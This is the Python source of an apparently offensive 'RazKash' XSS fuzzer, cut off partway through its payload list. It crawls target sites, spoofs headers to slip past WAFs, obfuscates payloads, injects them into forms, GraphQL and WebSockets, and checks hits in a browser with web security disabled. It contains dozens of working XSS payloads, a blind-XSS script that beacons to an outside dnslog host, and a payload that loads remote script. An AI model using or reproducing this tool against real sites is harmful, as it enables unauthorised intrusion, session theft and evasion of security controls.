#!/usr/bin/env python3
# =============================================================================
# RazKash 𝕏SS AI Fuzzer · v9.2  
# Author : Haroon Ahmad Awan · CyberZeus (mrharoonawan@gmail.com)
# =============================================================================

import os
import re
import ssl
import sys
import json
import time
import random
import string
import argparse
import warnings
import logging
import base64
import threading
import contextlib
import codecs
import xml.etree.ElementTree as ET
from pathlib import Path
from typing import List, Dict, Any
from difflib import SequenceMatcher
from concurrent.futures import ThreadPoolExecutor

import urllib.parse
import requests
from requests.adapters import HTTPAdapter
from bs4 import BeautifulSoup
from fake_useragent import UserAgent

import torch
from transformers import AutoTokenizer, AutoModelForMaskedLM, logging as hf_log

# Optional: Playwright & websocket
try:
    from playwright.sync_api import sync_playwright
except ImportError:
    sync_playwright = None

try:
    import websocket
except ImportError:
    websocket = None

# ─────────────────────────────────────────────────────────────────────────────
#                              CONFIG
# ─────────────────────────────────────────────────────────────────────────────

VER               = "9.2-omni-enterprise (SUPER DYNAMIC)"
MODEL             = "microsoft/codebert-base"
DNSLOG_DOMAIN     = "ugxllx.dnslog.cn"
LOGFILE           = Path("razkash_findings.md")

TOP_K             = 7
DEF_THREADS       = 16
MAX_STATIC_PAGES  = 300
MAX_NESTED_DEPTH  = 5

RATE_LIMIT_SLEEP  = 0.05
SESSION_SPLICE_MS = 100
JITTER_MIN_MS     = 20
JITTER_MAX_MS     = 200

VERIFY_TIMEOUT    = 9000
HTTP_TIMEOUT      = 12
HEADLESS_WAIT     = 3500

WAF_SPOOF_HEADERS = [
    {"User-Agent": "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"},
    {"User-Agent": "curl/7.68.0"},
    {"User-Agent": "Wget/1.20.3 (linux-gnu)"},
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Client-IP": "127.0.0.1"},
]

# ─────────────────────────────────────────────────────────────────────────────
#                              ARGUMENTS
# ─────────────────────────────────────────────────────────────────────────────

ap = argparse.ArgumentParser(description="RazKash v9.2 SUPER DYNAMIC XSS Fuzzer")
mx = ap.add_mutually_exclusive_group()
mx.add_argument("--reflected", action="store_true", help="Test only reflected XSS")
mx.add_argument("--stored",    action="store_true", help="Test only stored XSS")
mx.add_argument("--blind",     action="store_true", help="Test only blind XSS")
mx.add_argument("--invent",    action="store_true", help="AI-driven payload placeholders (MASK)")
ap.add_argument("-u","--url",           help="Target root URL")
ap.add_argument("--autotest",           action="store_true", help="Use built-in labs")
ap.add_argument("--login-url",          help="Login endpoint")
ap.add_argument("--username",           help="Login username")
ap.add_argument("--password",           help="Login password")
ap.add_argument("--csrf-field",         default="csrf", help="CSRF field name")
ap.add_argument("--threads",            type=int, default=DEF_THREADS)
ap.add_argument("--max-pages",          type=int, default=MAX_STATIC_PAGES)
ap.add_argument("--nested-depth",       type=int, default=MAX_NESTED_DEPTH)
ap.add_argument("--simulate-spa",       action="store_true")
ap.add_argument("--crawl-iframes",      action="store_true")
ap.add_argument("--detect-waf",         action="store_true")
ap.add_argument("--polymorph",          action="store_true", help="Use random obfuscation transformations")
ap.add_argument("--headed",             action="store_true", help="Headed browser mode (Playwright)")
ap.add_argument("--debug",              action="store_true", help="Debug logging")
args = ap.parse_args()
DEBUG = args.debug

logging.basicConfig(
    level=logging.DEBUG if DEBUG else logging.INFO,
    format="%(asctime)s %(levelname)s: %(message)s"
)
warnings.filterwarnings("ignore")
hf_log.set_verbosity_error()
os.environ["TRANSFORMERS_NO_TQDM"] = "1"
ssl._create_default_https_context = ssl._create_unverified_context

def dbg(msg: str):
    if DEBUG:
        logging.debug(msg)

# ─────────────────────────────────────────────────────────────────────────────
#                              UTILITIES
# ─────────────────────────────────────────────────────────────────────────────

def randstr(n=12):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=n))

def jitter(a=JITTER_MIN_MS, b=JITTER_MAX_MS):
    time.sleep(random.uniform(a/1000, b/1000))

def session_splice():
    time.sleep(SESSION_SPLICE_MS/1000)

def rate_limit():
    time.sleep(RATE_LIMIT_SLEEP)

def smart_url(raw: str) -> str:
    if raw.startswith(("http://","https://")):
        return raw
    for scheme in ("https://","http://"):
        try:
            r = requests.head(scheme + raw, timeout=3, verify=False)
            if r.status_code < 500:
                return scheme + raw
        except:
            pass
    return "http://" + raw

def random_headers() -> Dict[str,str]:
    ua = UserAgent()
    h = {"User-Agent": ua.random}
    if args.detect_waf:
        h.update(random.choice(WAF_SPOOF_HEADERS))
    return h

# ─────────────────────────────────────────────────────────────────────────────
#                         AI MODEL (MASK FILLING)
# ─────────────────────────────────────────────────────────────────────────────

device = torch.device("cuda" if torch.cuda.is_available() else "cpu")
tok    = AutoTokenizer.from_pretrained(MODEL)
mdl    = AutoModelForMaskedLM.from_pretrained(MODEL).to(device).eval()
MASK_T, MASK_ID = tok.mask_token, tok.mask_token_id

def ai_mutate(template: str) -> str:
    s = template
    while "MASK" in s:
        ids = tok(s.replace("MASK", MASK_T, 1), return_tensors="pt").input_ids.to(device)
        with torch.no_grad():
            logits = mdl(ids).logits
        pos = (ids == MASK_ID).nonzero(as_tuple=True)[1][0]
        token_id = random.choice(logits[0,pos].topk(TOP_K).indices.tolist())
        w = tok.decode(token_id).strip() or "alert(1)"
        s = s.replace("MASK", w, 1)
    return s

# ─────────────────────────────────────────────────────────────────────────────
#                           SUPER ADVANCED OBFUSCATION
# ─────────────────────────────────────────────────────────────────────────────

obfuscation_methods = [

    # 1) No change
    lambda p: p,

    # 2) \xHH
    lambda p: "".join(f"\\x{ord(c):02x}" for c in p) if p else p,

    # 3) \uHHHH
    lambda p: "".join(f"\\u{ord(c):04x}" for c in p) if p else p,

    # 4) base64
    lambda p: base64.b64encode(p.encode()).decode(errors='ignore') if p else p,

    # 5) utf-16 decode
    lambda p: p.encode('utf-16','ignore').decode('utf-16','ignore') if p else p,

    # 6) rot13
    lambda p: codecs.encode(p,'rot_13') if p else p,

    # 7) url-encode
    lambda p: urllib.parse.quote(p) if p else p,

    # 8) HTML-escape < >
    lambda p: p.replace('<','&lt;').replace('>','&gt;') if p else p,

    # 9) HTML-escape quotes
    lambda p: p.replace('"','&quot;').replace("'",'&#39;') if p else p,

    # 10) slash-escape
    lambda p: "".join(f"\\{c}" for c in p) if p else p,

    # 11) %HH
    lambda p: "".join(f"%{ord(c):02X}" for c in p) if p else p,

    # 12) &#xHH;
    lambda p: "".join(f"&#x{ord(c):X};" for c in p) if p else p,

    # 13) &#DD;
    lambda p: "".join(f"&#{ord(c)};" for c in p) if p else p,

    # 14) Insert /**/
    lambda p: "".join(f"{c}/**/" for c in p) if p else p,

    # 15) Reverse
    lambda p: p[::-1] if p else p,

    # 16) Uppercase
    lambda p: p.upper() if p else p,

    # 17) Lowercase
    lambda p: p.lower() if p else p,

    # 18) Swapcase
    lambda p: p.swapcase() if p else p,

    # 19) Remove null
    lambda p: p.replace('\x00','') if p else p,

    # 20) Double-URL-encode
    lambda p: urllib.parse.quote(urllib.parse.quote(p)) if p else p,
]

def _expand_obf():
    extra = []

    def encode_to_utf32_le(s):
        try:
            return s.encode('utf-32-le','ignore').decode('latin-1','ignore')
        except:
            return s

    def double_rot13(s):
        # ROT13 twice is original, but let's do triple to shift again
        return codecs.encode(codecs.encode(codecs.encode(s, 'rot_13'), 'rot_13'),'rot_13')

    # We'll create a bunch of transformations
    expansions = [
        lambda p: "".join(f"\\0{oct(ord(c))[2:]}" for c in p) if p else p,
        lambda p: "".join(f"\\u{{{ord(c):04x}}}" for c in p) if p else p,
        lambda p: "".join(f"&#x{ord(c):04x};" for c in p) if p else p,
        lambda p: base64.urlsafe_b64encode(p.encode()).decode('ascii','ignore') if p else p,
        lambda p: encode_to_utf32_le(p) if p else p,
        lambda p: "".join(chr((ord(c)+1) % 256) for c in p) if p else p,  # shift each char +1
        lambda p: "".join(chr((ord(c)-1) % 256) for c in p) if p else p,  # shift -1
        lambda p: double_rot13(p) if p else p,  # triple rot13 example
        lambda p: p.replace("<","＜").replace(">","＞") if p else p,
        lambda p: re.sub(r"[aeiouAEIOU]", lambda m: m.group(0)+"\u200B", p) if p else p, 
        lambda p: codecs.encode(p,"hex_codec").decode('ascii') if p else p,
        lambda p: p[::-1].upper() if p else p,
        lambda p: "‼".join(p) if p else p,   # insert a weird char between each letter
        lambda p: "".join(f"\\U0000{ord(c):04X}" for c in p) if p else p,
        lambda p: p.replace("<","%3C").replace(">","%3E") if p else p,
        lambda p: "".join(c for c in p if c.isalnum()) if p else p,  # remove non-alnum
        lambda p: p.replace(" ","%20") if p else p,
        lambda p: p.replace(" ","\t") if p else p,
        lambda p: " ".join(reversed(p.split())) if p else p, 
        lambda p: "".join("\\x"+hex(ord(c))[2:].zfill(2)+"\\" for c in p) if p else p,
        lambda p: "\u202E"+p+"\u202C" if p else p,  # Use RTL override
    ]

    all_variants = expansions * 10  # expansions repeated to get ~100
    for i in range(100):
        all_variants.append(lambda p, i=i: p+"<!--rand"+str(i)+"-->" if p else p)
    return all_variants

_extra_methods = _expand_obf()
obfuscation_methods.extend(_extra_methods)


# ─────────────────────────────────────────────────────────────────────────────
#                        ERROR DETECTION / PATTERNS
# ─────────────────────────────────────────────────────────────────────────────

SQL_ERROR_RE = re.compile(r"(SQL syntax|MySQL|syntax error|Error|error|ERROR|unclosed quotation|InnoDB|PostgreSQL)", re.I)

# ─────────────────────────────────────────────────────────────────────────────
#                            VERIFICATION
# ─────────────────────────────────────────────────────────────────────────────

def verify(url: str, method: str, data: Any, is_json: bool=False) -> bool:
    """
    Super-advanced verification using Playwright with DOM sink detection,
    race condition fuzzing, iframe sandbox breakout, Shadow DOM probing,
    and visual logging via screenshot.
    """
    if not sync_playwright:
        return False

    try:
        screenshot_dir = Path("screenshots")
        screenshot_dir.mkdir(exist_ok=True)

        url_hash = hashlib.md5(f"{url}{json.dumps(data, sort_keys=True)}".encode()).hexdigest()[:8]

        with sync_playwright() as p:
            browser = p.chromium.launch(
                headless=not args.headed,
                args=["--disable-web-security", "--ignore-certificate-errors", "--no-sandbox"]
            )

            context = browser.new_context(
                ignore_https_errors=True,
                user_agent=UserAgent().random,
                record_video_dir=str(screenshot_dir / "videos")
            )

            page = context.new_page()

            page.add_init_script(f"""
                window._xss_triggered = false;
                window._xss_reason = "unknown";
                const mark = (r) => {{
                    window._xss_triggered = true;
                    window._xss_reason = r || "unknown";
                }};

                // Hook common sinks
                ['alert','confirm','prompt'].forEach(fn => {{
                    const o = window[fn];
                    window[fn] = (...a) => {{ mark(fn); return o(...a); }};
                }});

                document.addEventListener('securitypolicyviolation', () => mark("csp-violation"));

                // MutationObserver (DOM diff race)
                const mo = new MutationObserver(() => mark("mutation-observer"));
                mo.observe(document, {{ childList: true, subtree: true }});

                // Delayed DOM injection with multiple vector types
                setTimeout(() => {{
                    // Image vector
                    const img = document.createElement("img");
                    img.src = "x";
                    img.onerror = () => mark("img-onerror");
                    document.body.appendChild(img);

                    // Inline script injection
                    const s = document.createElement("script");
                    s.innerHTML = "mark('inline-script')";
                    document.body.appendChild(s);

                    // Style trick
                    const st = document.createElement("style");
                    st.innerHTML = "*{{background:url('javascript:alert(1)')}}";
                    document.head.appendChild(st);

                    // Iframe injection with srcdoc
                    const ifr = document.createElement("iframe");
                    ifr.srcdoc = '<script>parent.mark("iframe-srcdoc")</script>';
                    document.body.appendChild(ifr);

                    // Shadow DOM sink
                    const div = document.createElement("div");
                    const shadow = div.attachShadow({{mode:'open'}});
                    const shadow_script = document.createElement("script");
                    shadow_script.innerHTML = "parent.mark('shadow-dom')";
                    shadow.appendChild(shadow_script);
                    document.body.appendChild(div);

                }}, 700);
            """)

            # Hook dialogs
            page.on("dialog", lambda d: (d.dismiss(), page.evaluate("mark('dialog')")))

            # Send request & render
            if method.upper() == "GET":
                q = urllib.parse.urlencode(data)
                page.goto(f"{url}?{q}", timeout=VERIFY_TIMEOUT, wait_until="networkidle")
            else:
                page.goto(url, timeout=VERIFY_TIMEOUT, wait_until="networkidle")
                headers = {"Content-Type": "application/json"} if is_json else {"Content-Type": "application/x-www-form-urlencoded"}
                body = json.dumps(data) if is_json else urllib.parse.urlencode(data)
                page.evaluate("(u,h,b) => fetch(u, {{method:'POST', headers:h, body:b}})", url, headers, body)

            # Before-shot (DOM snapshot before injection)
            before_ss = f"{url_hash}_before.png"
            page.screenshot(path=str(screenshot_dir / before_ss), full_page=True)

            # Wait for delayed triggers
            page.wait_for_timeout(HEADLESS_WAIT + 1200)

            # After-shot
            after_ss = f"{url_hash}_after.png"
            page.screenshot(path=str(screenshot_dir / after_ss), full_page=True)

            # Evaluate triggers
            hit = page.evaluate("window._xss_triggered")
            reason = page.evaluate("window._xss_reason")
            context.close()
            browser.close()

            if hit:
                dbg(f"[verify] XSS TRIGGERED by {reason} — Screenshots: {before_ss}, {after_ss}")
            else:
                dbg(f"[verify] No trigger — Screenshots captured: {before_ss}, {after_ss}")

            return bool(hit)

    except Exception as ex:
        dbg(f"[verify error] {ex}")
        return False



# ─────────────────────────────────────────────────────────────────────────────
#                               LOGGING
# ─────────────────────────────────────────────────────────────────────────────

if not LOGFILE.exists():
    LOGFILE.write_text(f"# RazKash Findings v{VER}\n\n", "utf-8")

_hits = set()
log_lock = threading.Lock()

def log_hit(url, method, payload, params=None):
    params = params or []
    entry = f"- **XSS** {method} `{url}` param={params} payload=`{payload}`\n"
    with log_lock:
        if entry in _hits:
            return
        _hits.add(entry)
        LOGFILE.write_text(LOGFILE.read_text("utf-8") + entry, "utf-8")
    logging.info(entry.strip())

# ─────────────────────────────────────────────────────────────────────────────
#                          SESSION / AUTH
# ─────────────────────────────────────────────────────────────────────────────

def get_authenticated_session():
    s = requests.Session()
    if args.login_url and args.username and args.password:
        if args.login_url.endswith("/rest/user/login"):
            # JSON-based login
            h = random_headers()
            h["Content-Type"] = "application/json"
            try:
                r = s.post(args.login_url, json={"email": args.username,"password": args.password},
                           headers=h, timeout=HTTP_TIMEOUT, verify=False)
                j = r.json()
                token = j.get("token") or j.get("authentication",{}).get("token")
                if token:
                    s.headers.update({"Authorization": f"Bearer {token}"})
            except:
                pass
        else:
            # HTML form-based
            r0 = s.get(args.login_url, headers=random_headers(), timeout=HTTP_TIMEOUT, verify=False)
            csrf_val = re.search(f'name="{args.csrf_field}" value="([^"]+)"', r0.text)
            data={}
            if csrf_val:
                data[args.csrf_field]=csrf_val.group(1)
            data.update({"username": args.username,"password": args.password})
            s.post(args.login_url, data=data, headers=random_headers(), timeout=HTTP_TIMEOUT, verify=False)

    s.mount("https://", HTTPAdapter(pool_connections=50, pool_maxsize=50))
    s.mount("http://",  HTTPAdapter(pool_connections=50, pool_maxsize=50))
    return s

SESSION = get_authenticated_session()

# ─────────────────────────────────────────────────────────────────────────────
#                            GRAPHQL INTROSPECTION
# ─────────────────────────────────────────────────────────────────────────────

INTROSPECTION = """ query IntrospectionQuery {
  __schema {
    queryType { name }
    mutationType { name }
    types {
      kind name
      fields {
        name
        args {
          name
          type {
            kind
            name
            ofType { kind }
          }
        }
      }
    }
  }
}
"""

def discover_graphql_ops(ep):
    try:
        resp = SESSION.post(ep, json={"query":INTROSPECTION}, timeout=HTTP_TIMEOUT, verify=False)
        j = resp.json()
        sch = j["data"]["__schema"]
        ops = []
        for kind in ("queryType","mutationType"):
            root = sch.get(kind)
            if not root:
                continue
            for t in sch["types"]:
                if t["name"]==root["name"]:
                    for f in t["fields"]:
                        arg_names = [a["name"] for a in f["args"] if a["type"]["name"]=="String"]
                        if arg_names:
                            ops.append((f["name"],arg_names))
        return ops
    except:
        return []

def fuzz_graphql(ep):
    for name, args_ in discover_graphql_ops(ep):
        for a in args_:
            payload = "<img src=x onerror=alert(1)>"
            try:
                r = SESSION.post(ep,
                    json={"query":f"mutation{{{name}({a}:\"{payload}\"){{__typename}}}}"},
                    timeout=HTTP_TIMEOUT, verify=False
                )
                dbg(f"[graphql] fuzzing {name}({a}) -> HTTP {r.status_code}")
            except Exception as ex:
                dbg(f"[graphql fuzz] {ex}")

# ─────────────────────────────────────────────────────────────────────────────
#                            CRAWLING
# ─────────────────────────────────────────────────────────────────────────────

def mine_js(url,host):
    found = []
    try:
        r = SESSION.get(url, headers=random_headers(), timeout=HTTP_TIMEOUT, verify=False)
        txt = r.text
        # Advanced pattern coverage with recursion
        js_call_re = re.compile(
            r'(?:fetch\(["\']|axios\.\w+\(["\']|XHR\.open\(["\'](?:GET|POST)["\'],\s*|WebSocket\(["\']|import\(["\'])'
            r'(/[^"\']+\.(?:js|php|asp|aspx|jsp|cgi|json|graphql|py|pl|rb|html|htm|dll|action)(?:\?[^"\']*)?)["\']',
            re.IGNORECASE
        )
        js_url_re = re.compile(
            r'["\'](/[^"\']+\.(?:js|php|asp|aspx|jsp|cgi|json|graphql|py|pl|rb|html|htm|dll|action)(?:\?[^"\']*)?)["\']|'
            r'["\'](/(?:api|ajax|rest)/[^"\']+)["\']|'
            r'window\.location\s*=\s*["\'](/[^"\']+)["\']|'
            r'document\.location\s*=\s*["\'](/[^"\']+)["\']',
            re.IGNORECASE
        )

        found_calls = js_call_re.findall(txt)
        for c in found_calls:
            if isinstance(c, str):
                found.append(c)
            elif isinstance(c, tuple):
                for i in c:
                    if i: found.append(i)

        for match in js_url_re.findall(txt):
            for m in match:
                if m:
                    found.append(m)

    except Exception as e:
        dbg(f"[mine_js error] {e}")

    out = set()
    js_links = []

    for u in found:
        full = urllib.parse.urljoin(url, u)
        if urllib.parse.urlparse(full).netloc.lower() == host:
            out.add(full)
            if full.lower().endswith(".js"):
                js_links.append(full)

    # Recursively parse each JS file
    for js_url in js_links:
        try:
            r = SESSION.get(js_url, headers=random_headers(), timeout=HTTP_TIMEOUT, verify=False)
            js_txt = r.text

            js_inner_re = re.compile(
                r'["\'](/[^"\']+\.(?:php|asp|aspx|jsp|cgi|json|graphql|py|pl|rb|html|htm|dll|action)(?:\?[^"\']*)?)["\']|'
                r'["\'](/(?:api|ajax|rest)/[^"\']+)["\']',
                re.IGNORECASE
            )
            for match in js_inner_re.findall(js_txt):
                for m in match:
                    if m:
                        full = urllib.parse.urljoin(js_url, m)
                        if urllib.parse.urlparse(full).netloc.lower() == host:
                            out.add(full)
        except Exception as e:
            dbg(f"[recursive js parse error] {e}")

    return list(out)


def misc_assets(root):
    base = urllib.parse.urlparse(root)._replace(path="",query="",fragment="").geturl()
    assets=[]
    try:
        # try robots
        txt = SESSION.get(base+"/robots.txt", headers=random_headers(), timeout=HTTP_TIMEOUT, verify=False).text
        for line in txt.splitlines():
            if line.lower().startswith("sitemap:"):
                assets.append(line.split(":",1)[1].strip())
    except:
        pass
    return assets

def crawl_static(root,cap,depth=0):
    visited=set()
    queue=[root]+misc_assets(root)
    targets=[]
    host=urllib.parse.urlparse(root).netloc.lower()
    while queue and len(visited)<cap:
        u=queue.pop(0)
        if u in visited:
            continue
        visited.add(u)
        try:
            r=SESSION.get(u, headers=random_headers(), timeout=HTTP_TIMEOUT, verify=False)
        except:
            continue
        ct=r.headers.get("content-type","").lower()
        if "javascript" in ct:
            # parse sub-requests
            for jurl in mine_js(u,host):
                if jurl not in visited:
                    queue.append(jurl)
            continue
        if "html" not in ct:
            continue
        soup=BeautifulSoup(r.text,"html.parser")
        if args.crawl_iframes and depth<args.nested_depth:
            for ifr in soup.find_all("iframe", src=True):
                src=urllib.parse.urljoin(u, ifr["src"])
                if urllib.parse.urlparse(src).netloc.lower()==host:
                    queue.append(src)
        for sc in soup.find_all("script", src=True):
            scr=urllib.parse.urljoin(u, sc["src"])
            if urllib.parse.urlparse(scr).netloc.lower()==host:
                queue.append(scr)

        for a in soup.find_all("a", href=True):
            link=urllib.parse.urljoin(u,a['href'])
            pu=urllib.parse.urlparse(link)
            if pu.netloc.lower()!=host:
                continue
            if link not in visited:
                queue.append(link)
            if pu.query:
                qs=list(urllib.parse.parse_qs(pu.query).keys())
                targets.append({"url":pu._replace(query="").geturl(),"method":"GET","params":qs})

        for f in soup.find_all("form"):
            act=urllib.parse.urljoin(u,f.get("action") or u)
            if urllib.parse.urlparse(act).netloc.lower()!=host:
                continue
            mth=f.get("method","get").upper()
            ps=[i.get("name") for i in f.find_all(["input","textarea","select"]) if i.get("name")]
            if ps:
                targets.append({"url":act,"method":mth,"params":ps})

    return targets

def crawl_dynamic(root):
    if not sync_playwright:
        return []
    found=[]
    seen=set()
    host=urllib.parse.urlparse(root).netloc.lower()

    try:
        with sync_playwright() as p:
            br = p.chromium.launch(headless=not args.headed, args=["--disable-web-security","--ignore-certificate-errors","--no-sandbox"])
            ctx=br.new_context(ignore_https_errors=True, user_agent=UserAgent().random)
            page=ctx.new_page()
            def on_req(req):
                u=req.url
                if urllib.parse.urlparse(u).netloc.lower()!=host or u in seen:
                    return
                seen.add(u)
                m=req.method.upper()
                hd=req.headers.get("content-type","").lower()
                is_json=("json" in hd or "graph" in hd)
                try:
                    data=json.loads(req.post_data or "{}")
                except:
                    data={}
                qs=list(urllib.parse.urlparse(u).query.split("&")) if "?" in u else []
                if data:
                    param_names=list(data.keys())
                else:
                    param_names=[x.split("=")[0] for x in qs if x] or ["payload"]
                found.append({
                    "url":u.split("?",1)[0],
                    "method":m if m in ("POST","PUT") else "GET",
                    "params":param_names,
                    "json":is_json,
                    "template":data
                })

            page.on("request", on_req)
            page.goto(root, timeout=VERIFY_TIMEOUT, wait_until="networkidle")
            time.sleep(1)
            ctx.close()
            br.close()
    except Exception as e:
        dbg(f"[crawl_dynamic] {e}")
    return found

# ─────────────────────────────────────────────────────────────────────────────
#                          FUZZING
# ─────────────────────────────────────────────────────────────────────────────

static_exts = {
    "png","jpg","jpeg","gif","bmp","svg","webp","ico","css","woff","woff2","ttf",
    "eot","otf","mp4","mp3","webm","pdf","zip","rar","7z","tar","gz"
}

def set_deep(obj:Any, path:str, val:Any):
    parts = re.split(r'\.|(\[\d+\])', path)
    parts = [p for p in parts if p and p.strip()]
    cur=obj
    for i, part in enumerate(parts):
        is_last=(i==len(parts)-1)
        if part.startswith('[') and part.endswith(']'):
            idx=int(part[1:-1])
            if is_last:
                cur[idx]=val
            else:
                if isinstance(cur[idx],(dict,list)):
                    cur=cur[idx]
                else:
                    cur[idx]={}
                    cur=cur[idx]
        else:
            if is_last:
                cur[part]=val
            else:
                if part not in cur or not isinstance(cur[part],(dict,list)):
                    cur[part]={}
                cur=cur[part]


def fuzz_http(t:Dict[str,Any]):
    ext=Path(urllib.parse.urlparse(t["url"]).path).suffix.lstrip('.').lower()
    if ext in static_exts:
        return
    rate_limit()
    session_splice()

    try:
        probe={p:"" for p in t["params"]}
        r0=(SESSION.get if t["method"]=="GET" else SESSION.post)(
            t["url"],
            params=probe if t["method"]=="GET" else None,
            data=probe  if t["method"]=="POST" else None,
            headers=random_headers(), timeout=HTTP_TIMEOUT, verify=False
        )
        if r0.status_code!=200:
            return
        if "image" in r0.headers.get("content-type","").lower():
            return
    except:
        return

    # If blind
    if args.blind and DNSLOG_DOMAIN:
        templates=[f"<script>new Image().src='http://{DNSLOG_DOMAIN}/?p='+encodeURIComponent('{randstr()}')</script>"]
    else:
        templates=PAYLOADS

    for tpl in templates:
        payload=tpl
        if "MASK" in payload:
            payload=ai_mutate(payload)
        if args.polymorph:
            payload=random.choice(obfuscation_methods)(payload)

        try:
            if t.get("json") and "template" in t:
                body=json.loads(json.dumps(t["template"]))
                for param in t["params"]:
                    set_deep(body, param, payload)
                resp=SESSION.post(
                    t["url"], json=body,
                    headers={"Content-Type":"application/json"},
                    timeout=HTTP_TIMEOUT, verify=False
                )
                sent_data=body
            else:
                sent_data={p:payload for p in t["params"]}
                resp=(SESSION.get if t["method"]=="GET" else SESSION.post)(
                    t["url"],
                    params=sent_data if t["method"]=="GET" else None,
                    data=sent_data if t["method"]=="POST" else None,
                    headers=random_headers(),
                    timeout=HTTP_TIMEOUT, verify=False
                )
            if resp.status_code in (403,429,503) or any(x in resp.text for x in ("captcha","denied","blocked")):
                continue
            if SQL_ERROR_RE.search(resp.text):
                continue

            if args.blind:
                log_hit(t["url"],"BLIND",payload,t["params"])
                return

            if verify(t["url"], t["method"], sent_data, t.get("json",False)):
                log_hit(t["url"], t["method"], payload, t["params"])
                return

        except Exception as ex:
            dbg(f"[fuzz_http error] {ex}")
        jitter()

def fuzz_ws(t:Dict[str,Any]):
    if not websocket:
        return
    if not t["url"].startswith(("ws://","wss://")):
        return
    url = t["url"]
    params = t.get("params", [])
    tpl = t.get("template") or {}
    marker = randstr()
    hit = False

    # Prepare chained payload
    try:
        body = json.loads(json.dumps(tpl))
    except:
        body = {}

    if body:
        set_deep(body, random.choice(params), f"<img src=x onerror=alert('{marker}')>")
    else:
        if params:
            body[random.choice(params)] = f"<svg onload=alert('{marker}')></svg>"
        else:
            body["payload"] = f"<svg onload=alert('{marker}')></svg>"

    payload = json.dumps(body)

    def on_msg(wsapp, msg):
        nonlocal hit
        if marker in msg or "XSS" in msg:
            hit = True

    try:
        wsapp = websocket.WebSocketApp(url, on_message=on_msg, header=random_headers())
        thr = threading.Thread(target=wsapp.run_forever, kwargs={"sslopt": {"cert_reqs": ssl.CERT_NONE}})
        thr.daemon = True
        thr.start()
        time.sleep(1)
        wsapp.send(payload)

        # Protocol chaining: try a follow-up command
        chained = json.dumps({"action": "get_status", "req": f"{marker}"})
        wsapp.send(chained)

        time.sleep(3)
        wsapp.close()

        if hit:
            log_hit(url, "WS", f"{payload} -> {chained}", params)

    except Exception as e:
        dbg(f"[fuzz_ws] {e}")

# ─────────────────────────────────────────────────────────────────────────────
#                          WAF DETECTION
# ─────────────────────────────────────────────────────────────────────────────

def detect_waf(url:str)->str:
    sigs={
        "cloudflare":["__cf_bm","cf-ray","Cloudflare Ray ID"],
        "akamai":["AkamaiGHost","akamai"],
        "sucuri":["sucuri_cloudproxy_uuid","Access Denied - Sucuri"],
        "imperva":["visid_incap_","incapsula"],
    }
    try:
        r=SESSION.get(url, headers=random_headers(), timeout=HTTP_TIMEOUT, verify=False)
        t=r.text.lower()
        for n,pats in sigs.items():
            if any(p.lower() in t for p in pats):
                return n
    except:
        pass
    return "unknown"

# ─────────────────────────────────────────────────────────────────────────────
#                              MAIN
# ─────────────────────────────────────────────────────────────────────────────

AUTOTEST=[
    "http://xss-game.appspot.com/",
    "http://xss-game.appspot.com/level1",
    "https://juice-shop.herokuapp.com/"
]


# ─────────────────────────────────────────────────────────────────────────────
#                     BASE XSS PAYLOADS + INVENT OPTION
# ─────────────────────────────────────────────────────────────────────────────

stored_payloads = [
    # 1–10: Simple <script> and common payloads
    '<script>alert(1)</script>',
    "<script>alert('XSS')</script>",
    '"><script>alert(document.domain)</script>',
    '<SCRIPT SRC=//example.com/xss.js></SCRIPT>',
    "<script>confirm('XSS')</script>",
    '<SCRIPT>alert("XSS");</SCRIPT>',
    "<scr<script>ipt>alert('XSS')</scr</script>ipt>",
    "<script>console.log('XSS');alert('XSS');</script>",
    '<script type="text/javascript">alert(/XSS/)</script>',
    "';alert('XSS');//",

    # 11–20: Image / Event Handler
    "<img src=x onerror=alert('XSS')>",
    "<img src=1 onerror=alert(/XSS/)>",
    '"><img src=x onerror=alert(\'XSS\')>',
    "<img src=\"javascript:alert('XSS')\">",
    "<img src=\"invalid\" onerror=\"alert('XSS')\">",
    '<IMG LOWSRC="javascript:alert(\'XSS\')">',
    "<img src=javascript:alert('XSS')>",
    "<img src=1 onload=alert(1)>",
    '"><img src=doesnotexist onerror=confirm(\'XSS\')>',
    "<img src=data: onerror=alert('XSS')>",

    # 21–30: Anchor / javascript: Schemes
    "<a href=\"javascript:alert('XSS')\">Click Me</a>",
    '"><a href="javascript:alert(/XSS/)">link</a>',
    "<a href=javascript:alert('XSS')>XSS Link</a>",
    "<a href=JaVaScRiPt:alert('XSS')>mixed-case link</a>",
    "<a href=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg>Base64Load</a>",
    "<a href=javascript:console.log('XSS');alert('XSS')>Debug+Alert</a>",
    "<a href=\"ja    vascript:alert('XSS')\">whitespace trick</a>",
    "<a href=\"javascript:eval('alert(XSS)')\">eval link</a>",
    "<a href=\"javascript:prompt('Stored XSS')\">Prompt link</a>",
    "\"><a href=javascript:alert('XSS') style=position:absolute;top:0;left:0>Overlay</a>",

    # 31–40: Iframe / Form / Body
    "<iframe src=\"javascript:alert('XSS')\"></iframe>",
    "<iframe srcdoc=\"<script>alert('XSS')</script>\"></iframe>",
    "<form action=\"javascript:alert('XSS')\"><input type=submit></form>",
    "<body onload=alert('XSS')>",
    "<body background=javascript:alert('XSS')>",
    "<form><button formaction=\"javascript:alert('XSS')\">XSS</button></form>",
    "\"><iframe src=javascript:alert(1)>",
    "<iframe/onload=alert('XSS')>",
    "<form action=\"\" onsubmit=alert(\"XSS\")><input type=submit value=\"Go\"></form>",
    "<BODY ONRESIZE=alert(\"XSS\")>resize me</BODY>",

    # 41–50: SVG / XML / MathML
    '<svg onload=alert("XSS")></svg>',
    '<svg><script>alert("XSS")</script></svg>',
    "<svg><desc><![CDATA[</desc><script>alert('XSS')</script>]]></svg>",
    "<svg><foreignObject><script>alert('XSS')</script></foreignObject></svg>",
    "<svg><p><style><img src=x onerror=alert(\"XSS\")></p></svg>",
    '<math><mtext></mtext><annotation encoding="application/ecmascript">alert("XSS")</annotation></math>',
    "<?xml version=\"1.0\"?><root><![CDATA[<script>alert('XSS')</script>]]></root>",
    "<svg onload=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg><a xlink:href=\"javascript:alert('XSS')\">CLICK</a></svg>",
    "\"><svg/onload=confirm('XSS')>",

    # 51–60: CSS, Meta
    '<style>*{background:url("javascript:alert(\'XSS\')");}</style>',
    "<style>@import 'javascript:alert(\"XSS\")';</style>",
    "<style>li {list-style-image: url(\"javascript:alert('XSS')\");}</style><ul><li>Test",
